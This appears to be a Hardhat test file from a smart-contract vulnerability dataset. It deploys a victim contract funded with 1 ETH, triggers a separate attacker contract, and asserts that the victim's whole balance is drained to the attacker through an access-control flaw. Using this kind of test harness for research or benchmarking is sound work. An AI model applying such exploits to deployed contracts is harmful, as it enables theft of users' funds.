const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const { getContractAddress } = require('@ethersproject/address')

describe('attack access_control/mycontract.sol', function () {
  let victim_sig;
  let attacker_sig;
  let amount;
    async function deployContracts() {
      const [v, a] = await ethers.getSigners();
      victim_sig = v;
      attacker_sig = a;
      const ownerNonce = await victim_sig.getNonce() + 1;
      const futureAddress = getContractAddress({
        from: victim_sig.address,
        nonce: ownerNonce
      });

      amount = ethers.parseEther("1.0");
      await victim_sig.sendTransaction({
        to: futureAddress,
        value: amount,
      });
      
      const MyContract = await ethers.getContractFactory('contracts/dataset/access_control/mycontract.sol:MyContract');
      const victim = await MyContract.deploy();  
      await victim.waitForDeployment();
      const victim_addr = await victim.getAddress();

      const MyContractAttacker = await ethers.getContractFactory('contracts/access_control/mycontract_attack.sol:MyContractAttacker');
      const attacker = await MyContractAttacker.deploy(victim_addr, attacker_sig.address);
      await attacker.waitForDeployment();
      return {victim, attacker};
    }

    it('exploit access control vulnerability', async function () {
      const {victim, attacker} = await loadFixture(deployContracts);
      const victim_addr = await victim.getAddress();
      const attacker_addr = await attacker.getAddress();

      const receiverBalance = await ethers.provider.getBalance(victim_addr);
      expect(receiverBalance).to.equal(ethers.parseEther("1.0"));

      const attackerBalanceBefore = await ethers.provider.getBalance(attacker_sig.address);
      const smallAmount = ethers.parseUnits("1", "wei");
      await victim_sig.sendTransaction({
        to: attacker_addr,
        value: smallAmount
      });
      const attackerBalanceAfter = await ethers.provider.getBalance(attacker_sig.address);
      expect(attackerBalanceAfter - attackerBalanceBefore).to.not.equal(smallAmount);
      expect(attackerBalanceAfter - attackerBalanceBefore).to.equal(amount);

      const receiverBalanceAfter = await ethers.provider.getBalance(victim_addr);
      expect(receiverBalanceAfter).to.equal(0);
    });
  });